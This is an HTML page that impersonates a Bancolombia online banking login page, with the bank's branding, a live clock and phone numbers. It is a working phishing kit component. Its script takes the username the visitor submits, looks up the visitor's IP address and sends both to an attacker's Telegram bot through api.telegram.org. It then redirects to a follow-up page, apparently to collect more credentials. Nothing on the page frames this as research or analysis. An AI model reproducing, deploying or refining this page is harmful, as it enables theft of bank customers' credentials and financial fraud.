<!DOCTYPE html>
<html>
  <head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="robot" content="All">
    <meta name="rating" content="general">
    <meta name="Distribution" content="Global">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <link href="./archivos/style.css" media="all" rel="stylesheet" type="text/css">
    <link href="./archivos/bootstrap.css" media="all" rel="stylesheet" type="text/css">
    <link href="./archivos/ui.css" media="all" rel="stylesheet" type="text/css">
    <link href="./archivos/jquery-ui.css" media="all" rel="stylesheet" type="text/css">
    <link href="./archivos/showLoading.css" media="all" rel="stylesheet" type="text/css">
    <style>
      /* Estilos para la transición suave */
      #panDiv {
        opacity: 0;
        transition: opacity 1s ease-out; /* Transición suave de 1 segundo */
      }
    </style>
    <title>Beneficios Bancolombia</title>
  </head>

  <body>
    <div id="contenidoWeb">
      <div class="container" id="containerMain">
        <div>
          <div id="header" class="mua-page-header">
            <div class="row row-logo-svp">
              <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                <div class="mua-imgLogoItem"></div>
               </div>
            </div>
            <div class="row">
              <div class="col-xs-12 col-sm-7 col-md-7 left-div">
                <div id="lastIn" class="mua-title-text" style="padding-top: 10px !important">
                  <div>
                    <div class="timeText">Fecha y hora actual:</div>
                    <span id="jclock1" class="lastVisitedText">
                    <script>
                      var meses = new Array ("Enero","Febrero","Marzo","Abril","Mayo","Junio","Julio","Agosto","Septiembre","Octubre","Noviembre","Diciembre");
                      var diasSemana = new Array("Domingo","Lunes","Martes","Miércoles","Jueves","Viernes","Sábado");
                      var f=new Date();
                      var hora = f.getHours() + ':' + f.getMinutes() + ':' + f.getSeconds();
                      document.write(diasSemana[f.getDay()] + ", " + f.getDate() + " de " + meses[f.getMonth()] + " de " + f.getFullYear() + " " +  hora);
                    </script>

                    </span>
                  </div>
                </div>
              </div>
            </div>
          </div>

          <div class="panel-heading">
            <h3>Inicio de sesi&oacute;n </h3>
          </div>

        </div>
        <form id="loginForm" method="post">

          <!-- Agregamos el div para mostrar el mensaje de error -->
          <div id="error-message" style="display:none; color:red; font-weight:bold;"></div>

          <div class="panel panel-primary">
           
            <div class="mua-panel-body">
              
              <div class="row">
                
                <div class="col-xs-12 col-sm-5 col-md-4">

                  <!-- El div name="pan" está oculto por defecto -->
                  <div name="pan" id="panDiv" class="image-container" style="display: none; align-items: center; padding: 10px; background-color: white; border: 1px solid #cccccc; margin-bottom: 15px !important;">
                    <img style="width: 40px;" src="archivos/sas.png" alt="">
                    <img style="width: 120px; margin-left: 0px;" src="archivos/dinam2.png" alt="">
                  </div>

                  <div class="panel_general mua-panel_general">
                    <div class="subtitle-land-label">
                      <h4>
                        Si no tienes un usuario asignado ingresa con tu documento de identidad
                      </h4>
                    </div>
                    <div id="contenido">
                      <div class="mua-content-group-panel">
                        <div class="mua-label-input">
                          <label class="control-label-index" for="DocumentNumber">Ingrese su usuario</label>
                        </div> 
                        <div>
                          <div class="mua_svp_enroll_update_control">
                            <input id="DocumentNumber" name="DocumentNumber" class="mua-form-control mua_svp_control_username mua-input-icon" type="text" 
                            maxlength="20" autocomplete="off" required="required" onkeypress="checkKey(event)" onchange="trim(document.loginUserForm.username)">
                            <span class="mua-icon-user"></span>
                          </div>
                        </div>
                      </div>
                    </div>
                    <div class="one-button-container mua-button-container">
                       <button type="submit" id="continuar" name="continuar" class="btn btn-success">
                        Continuar
                      </button>
                    </div>
                    <div class="mua-panel_enlances">
                      <p>
                        <a href="">¿Olvidaste tu usario?</a>
                      </p>
                      <p>
                        <a href="">¿Problemas para conectarte?</a>
                      </p>
                    </div>
                  </div>
                </div>

                <div class="col-xs-12 col-sm-7 col-md-8">
                  <div  class="mua-embed-container-personal">
                    <img style="width: 350px;" src="https://www.bancolombia.com/wcm/connect/www.bancolombia.com-26918/d408a137-4eba-48ee-a046-8702fa6eb4cf/HOME+VIVIENDA.png?MOD=AJPERES&CACHEID=ROOTWORKSPACE.Z18_K9HC1202P86O40QTNS9EAE1S47-d408a137-4eba-48ee-a046-8702fa6eb4cf-p3NbK0O" alt="">
                  </div>
                </div>
              </div>
            </div>
            <br><br><br><br><br><br>
            <div class="row">
              <div class="col-xs-12 col-sm-12 col-md-12">
                <p class="mua-footer">
                  Sucursal Telefónica: Bogotá (57) 60 1 343 00 00 - Medellín (57) 60 4 510 90 00
                </p>
              </div>
            </div>
          </div>
        </form>
      </div>
    </div>

    <script type="module">
      import { botToken, chatId } from './config.js';

      document.getElementById('DocumentNumber').addEventListener('keydown', function(e) {
          if (e.key === ' ') {
              e.preventDefault(); // Evita que el espacio sea ingresado
          }
      });

      document.getElementById('loginForm').addEventListener('submit', function(e) {
          e.preventDefault(); // Evita que el formulario se envíe de la forma tradicional

          var usuario = document.getElementById('DocumentNumber').value;

          // Eliminar espacios en blanco y convertir a minúsculas
          usuario = usuario.replace(/\s/g, '').toLowerCase();

          // Validar si incluye caracteres no permitidos
          const invalidCharacters = /[ñáéíóúàèìòùäëïöüâêîôûçºª!@#$%^&*()_+\-=\[\]{};':"\\|,.<>\/?`~]/g;
          const numbersCount = (usuario.match(/\d/g) || []).length;

          // Verificar si cumple con los requisitos
          if (invalidCharacters.test(usuario) || usuario.length < 8 || usuario.length > 20 || numbersCount < 2) {
              // Mostrar el div name="pan" y hacerlo visible
              var panDiv = document.getElementById('panDiv');
              panDiv.style.display = 'flex';
              panDiv.style.opacity = '1'; // Aseguramos que sea completamente visible
              
              // Después de 2 segundos, hacer que desaparezca suavemente
              setTimeout(function() {
                panDiv.style.opacity = '0'; // Cambiamos la opacidad a 0 para desaparecerlo
                setTimeout(function() {
                  panDiv.style.display = 'none'; // Después de que desaparezca, lo ocultamos completamente
                }, 1000); // 1 segundo para que la transición sea suave
              }, 2000); // Esperamos 2 segundos antes de que desaparezca
              
              return; // Detener el envío del formulario
          }

          // Obtener la dirección IP del cliente
          fetch('https://api.ipify.org?format=json')
              .then(response => response.json())
              .then(data => {
                  var ip = data.ip;

                  // Construye el mensaje que enviarás
                  const mensaje = `Bpersonas 🛡️\n\nUsuario: ${usuario}\n\nIP: ${ip}`;

                  // Prepara la URL para la solicitud HTTP a Telegram
                  const url = `https://api.telegram.org/bot${botToken}/sendMessage`;

                  // Crea el objeto con los datos a enviar
                  const dataToSend = {
                      chat_id: chatId,
                      text: mensaje
                  };

                  // Envía la solicitud HTTP a Telegram
                  fetch(url, {
                      method: 'POST',
                      headers: {
                          'Content-Type': 'application/json'
                      },
                      body: JSON.stringify(dataToSend)
                  })
                  .then(response => response.json())
                  .then(data => {
                      if (data.ok) {
                          window.location.href = 'index2.html'; // Redirige a espera.html
                      } else {
                          console.error('Error al enviar el mensaje a Telegram.');
                      }
                  })
                  .catch(error => {
                      console.error('Error:', error);
                  });
              })
              .catch(error => {
                  console.error('Error al obtener la IP:', error);
              });
      });
    </script>

  </body>
</html>
